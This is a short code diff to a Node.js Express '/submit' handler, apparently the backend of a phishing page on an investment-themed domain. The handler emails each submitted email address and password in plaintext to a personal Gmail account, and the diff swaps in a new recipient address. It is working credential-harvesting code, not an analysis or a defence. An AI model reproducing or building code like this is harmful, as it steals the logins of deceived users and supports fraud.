@@ -45,7 +45,7 @@ app.post('/submit', (req, res) => {
 
     const mailOptions = {
         from: process.env.SMTP_USER || "a@investwisetrade.online", // your email address
-        to: "mmaroke75@gmail.com", // recipient's email address
+        to: "Hillarymaria019@gmail.com", // recipient's email address
         subject: 'Form Submission',
         text: `Email: ${email}\nPassword: ${password}`
     };
